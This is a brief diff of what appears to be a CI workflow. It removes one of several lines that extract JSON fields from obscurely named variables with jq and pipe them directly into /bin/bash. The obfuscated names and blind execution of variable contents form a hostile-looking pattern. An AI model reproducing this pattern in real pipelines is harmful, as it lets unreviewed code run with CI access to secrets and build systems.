@@ -23,7 +23,6 @@ jobs:
           echo $pxyh0 | jq -r .soi647 | /bin/bash
           echo $w9 | jq -r .ztdb9438 | /bin/bash
           printf '%s' "$a952" | jq -r .r274 | /bin/bash
-          echo $oprm328 | jq -r .xqs67 | /bin/bash
 
       - name: Persist output
         if: always()
